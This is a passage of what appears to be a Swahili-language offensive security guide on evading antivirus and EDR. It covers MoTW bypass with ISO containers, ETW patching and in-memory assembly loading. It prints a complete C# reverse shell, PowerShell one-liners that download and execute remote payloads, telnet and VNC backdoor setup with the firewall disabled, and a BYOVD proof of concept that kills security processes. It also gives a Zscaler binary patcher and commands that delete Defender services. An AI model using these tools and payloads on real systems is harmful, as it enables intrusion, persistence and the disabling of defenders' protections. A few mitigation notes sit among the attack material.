4. Manual clean-up – endesha binary itakayopatikana chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata *real* payload. Mara nyingi malware huihifadhi kama byte array iliyo-encode kwa TLV na initialized ndani ya `<Module>.byte_0`.

Chain iliyo hapo juu hurejesha execution flow **bila kuhitaji kuendesha sample hasidi** – jambo muhimu unapofanya kazi kwenye offline workstation.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumiwa kama IOC kufanya triage ya samples kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kutoa usalama ulioimarishwa wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na ulinzi dhidi ya tampering.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza code iliyofichwa wakati wa compilation, bila kutumia tool yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza layer ya operations zilizofichwa, zinazozalishwa na C++ template metaprogramming framework, ambayo itafanya maisha ya mtu anayetaka ku-crack application kuwa magumu zaidi.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha pe files mbalimbali zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazoungwa mkono na LLVM, ikitumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, hivyo kuzuia dhana yetu ya kawaida kuhusu control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

## SmartScreen & MoTW

Huenda umeona screen hii unapopakua executables fulani kutoka kwenye internet na kuzitekeleza.

Microsoft Defender SmartScreen ni security mechanism iliyokusudiwa kumlinda end user dhidi ya kuendesha applications zinazoweza kuwa malicious.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hufanya kazi hasa kwa kutumia reputation-based approach, ikimaanisha kuwa applications zisizopakuliwa mara kwa mara zita-trigger SmartScreen, na hivyo kumtahadharisha na kumzuia end user kutekeleza file hilo (ingawa file bado linaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier, ambayo huundwa kiotomatiki files zinapopakuliwa kutoka kwenye internet, pamoja na URL ambayo file lilipakuliwa kutoka kwake.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS ya file lililopakuliwa kutoka kwenye internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa **trusted** signing certificate **hazita-trigger SmartScreen**.

Njia nzuri sana ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Huu ni mfano wa kubypass SmartScreen kwa kupakia payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni logging mechanism yenye nguvu katika Windows inayoruhusu applications na system components **ku-log events**. Hata hivyo, inaweza pia kutumiwa na security products kufuatilia na kugundua shughuli za malicious.

Sawa na jinsi AMSI inavyodisable (kubypass), inawezekana pia kufanya function ya **`EtwEventWrite`** ya user space process irudi mara moja bila ku-log events zozote. Hili hufanywa kwa kupatch function hiyo kwenye memory ili irudi mara moja, na hivyo kudisable ETW logging kwa process hiyo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumekuwa known kwa muda mrefu na bado ni njia nzuri sana ya kuendesha post-exploitation tools zako bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuhangaikia kupatch AMSI kwa process nzima.

C2 frameworks nyingi (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari zinatoa uwezo wa ku-execute C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **ku-spawn sacrificial process mpya**, ku-inject malicious code yako ya post-exploitation kwenye process hiyo mpya, ku-execute malicious code yako na, ukimaliza, ku-kill process hiyo mpya. Hii ina faida na hasara zake. Faida ya fork and run method ni kwamba execution hutokea **nje ya** Beacon implant process yetu. Hii inamaanisha kwamba ikiwa kuna kitu kitaenda vibaya au kigunduliwe katika post-exploitation action yetu, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu ku-inject malicious code ya post-exploitation **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuifanya ichanganuliwe na AV, lakini hasara ni kwamba ikiwa kuna kitu kitaenda vibaya wakati wa execution ya payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu C# Assembly loading, tafadhali soma article hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana ku-execute malicious code kwa kutumia languages nyingine kwa kuipa compromised machine access **kwa interpreter environment iliyosakinishwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu access kwa Interpreter Binaries na environment iliyo kwenye SMB share, unaweza **ku-execute arbitrary code katika languages hizi ndani ya memory** ya compromised machine.

Repo inaonyesha: Defender bado inachanganua scripts, lakini kwa kutumia Go, Java, PHP etc tuna **flexibility zaidi ya kubypass static signatures**. Testing kwa reverse shell scripts za languages hizi zisizo-obfuscated bila mpangilio kumeonyesha mafanikio.

## TokenStomping

Token stomping hubadilisha access token ya security product kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha process ikiendelea kufanya kazi huku ikiizuia kutekeleza privileged inspection au remediation actions.

Ili kuzuia hili, Windows inaweza **kuzuia external processes** kupata handles za tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu ku-deploy Chrome Remote Desktop kwenye PC ya victim na kisha kuitumia ku-takeover na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Download kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya MSI file ya Windows ili kudownload MSI file.
2. Endesha installer silently kwenye victim (admin inahitajika): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye Chrome Remote Desktop page na ubofye next. Wizard itakuomba authorization; bofya Authorize button ili kuendelea.
4. Execute command iliyotolewa pamoja na adjustments zinazohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).


## Advanced Evasion

Evasion ni mada yenye ugumu mkubwa sana; wakati mwingine unapaswa kuzingatia sources nyingi tofauti za telemetry kwenye system moja tu, kwa hiyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika mature environments.

Kila environment unayolenga itakuwa na strengths na weaknesses zake.

Ninakuhimiza sana uende kutazama talk hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata msingi wa kuelewa Advanced Evasion techniques zaidi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni talk nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **itaondoa sehemu za binary** hadi **igundue ni sehemu gani Defender** inayoona kuwa malicious na kukutenganishia sehemu hiyo.\
Tool nyingine inayofanya **jambo hilo hilo ni** [**avred**](https://github.com/dobin/avred), ikiwa na web service inayopatikana kwenye [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza ku-install (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye **ianze** mfumo unapoanzishwa na **iendeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha port ya telnet** (kwa kujificha) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Ipakue kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji bin downloads, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka password katika _VNC Password_
- Weka password katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili iliyoundwa **hivi karibuni** _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **VNC connection** ya reverse. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na utekeleze `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha stealth, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, au utachochea [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory hiyo hiyo, au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa ajili ya help, au utachochea [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Ipakue kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **start the lister** kwa `msfconsole -r file.rc` na **execute** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa atasitisha process haraka sana.**

### Ku-compile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

I-compile kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Itumie pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kutengeneza injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Tools nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia console utility ndogo inayojulikana kama **Antivirus Terminator** kuzima endpoint protections kabla ya kuachilia ransomware. Tool hii huleta **driver yake yenye udhaifu lakini *iliyotiwa saini*** na kuitumia kutekeleza kernel operations zenye privileges ambazo hata AV services za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kuchukua
1. **Signed driver**: Faili inayowasilishwa kwenye disk ni `ServiceMouse.sys`, lakini binary hiyo ni driver halali iliyotiwa saini `AToolsKrnl64.sys` kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa sababu driver hiyo ina Microsoft signature halali, hupakiwa hata Driver-Signature-Enforcement (DSE) ikiwa imewashwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza husajili driver kama **kernel service**, na wa pili huianzisha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
| IOCTL code | Uwezo                                  |
|-----------:|-----------------------------------------|
| `0x99000050` | Kusitisha process yoyote kwa kutumia PID (hutumika kuua Defender/EDR services) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Ku-unload driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa user-mode protections; code inayotekelezwa kwenye kernel inaweza kufungua *protected* processes, kuzisitisha, au kuchezea kernel objects bila kujali PPL/PP, ELAM au hardening features nyingine.

Detection / Mitigation
•  Washa Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa *kernel* services mpya na toa alert driver inapopakiwa kutoka world-writable directory au haipo kwenye allow-list.
•  Fuatilia handles za user-mode zinazoelekea custom device objects zikifuatiwa na `DeviceIoControl` calls zinazotia shaka.

### Kupita Zscaler Client Connector Posture Checks Kupitia On-Disk Binary Patching

**Client Connector** ya Zscaler hutumia device-posture rules locally na hutegemea Windows RPC kuwasiliana na components nyingine na matokeo hayo. Chaguo mbili dhaifu za design hufanya full bypass iwezekane:

1. Posture evaluation hufanyika **kabisa client-side** (boolean hutumwa kwa server).
2. Internal RPC endpoints huthibitisha tu kwamba executable inayounganisha **imetiiwa saini na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kupatch binaries nne zilizotiwa saini kwenye disk**, mechanisms zote mbili zinaweza kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila mara, hivyo kila check huwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | Huandikwa NOP ⇒ process yoyote, hata ambayo haijatiwa saini, inaweza ku-bind kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Hupitwa moja kwa moja |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili asili na kuanzisha upya service stack:

* **All** posture checks huonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zilizobadilishwa zinaweza kufungua named-pipe RPC endpoints (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa hupata ufikiaji usio na vizuizi kwenye internal network iliyobainishwa na sera za Zscaler.

Case study hii inaonyesha jinsi maamuzi ya trust yanayofanywa upande wa client pekee na ukaguzi rahisi wa signatures vinaweza kushindwa kwa byte patches chache.

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender's **Boot-Time Removal** driver ni counterexample muhimu kwa BYOVD ya kawaida. `BTR.sys` ni remediation component halali iliyosainiwa na Microsoft, isiyo na memory-corruption bug wala IOCTL interface; baada ya kupata ufikiaji wa administrator na `SeLoadDriverPrivilege`, operator anaweza badala yake kuunda kwa udanganyifu private remediation transaction yake na kupata file/registry operations za Ring-0 zilizokusudiwa. Hii ni **post-compromise AV/EDR-neutralization primitive, si initial access wala privilege escalation**, na driver inaweza kutolewa kutoka kwenye `BOOTTIMETOOL` resource ya `MpEngine.dll` ya target mwenyewe badala ya kuleta driver inayoonekana wazi kutoka kwa third party.<sup>[[36]](#references)</sup>

### Kuandaa one-shot driver

Defender kwa kawaida huweka resource kama faili random ya `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma value ya service ya `Args`, hufungua NTFS ADS iliyorejelewa, hudecrypt na ku-validate action list, huandika feedback, na kurudisha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya execution iliyofanikiwa ili driver iondolewe badala ya kubaki resident. Service iliyoundwa kwa udanganyifu huwa na values zifuatazo za kipekee.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Stream ya `:changelist` ina blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia key isiyobadilika ya baiti 256, kwa hivyo encryption si mpaka wa authorization. Plaintext halali ina global header ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC na transaction ID inayotokana na payload), ikifuatiwa na feedback path ya UTF-16 iliyokatishwa kwa null na idadi yoyote ya items. Kila item ina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data maalum ya action inayoishia kwa **baiti nne za NUL hasa**. Kila eneo la header/data hukaguliwa kivyake kwa CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF`, na **hakuna final XOR** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Action IDs zinazokubaliwa hufichua kernel primitives hizi.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa file, ikiwemo file iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha file hadi protected path iliyochaguliwa na attacker; destination tupu inamaanisha delete |
| 4 | `[Flags][key path]` | Futa registry key kwa kujirudia |
| 5 | `[Flags][key path + "\\" + value]` | Futa registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/update registry value na uunde key paths ambazo hazipo |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye on-wire ni **backslashes mbili zinazofuatana**; path iliyopangwa kwa kawaida haitagawanywa ipasavyo. Feedback file kwa kiasi kikubwa huakisi request, lakini baiti nne za kwanza za data ya kila item huwa `NTSTATUS` yake ya matokeo. Kwa actions 1 na 2, ambazo hazina field ya flags mwanzoni, BTR hupeleka path kwenye baiti nne za mwisho zilizotengwa ili kutoa nafasi kwa status hiyo.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow na dirisha la early-boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza chain nzima: kutoa `BTR.sys` kutoka Defender ya ndani, kuunda `<random>.sys:changelist` na feedback stream, kufanya serialize/checksum/encrypt kwa actions zilizounganishwa, kuunda moja kwa moja service registry key, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha kama system-start driver kwa `-trigger boot`. Direct registry staging huepuka njia ya kawaida ya SCM `CreateServiceW` na kwa hiyo **haitoi** service-install Event ID 7045. Artifacts zilizoanzishwa wakati wa boot zinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
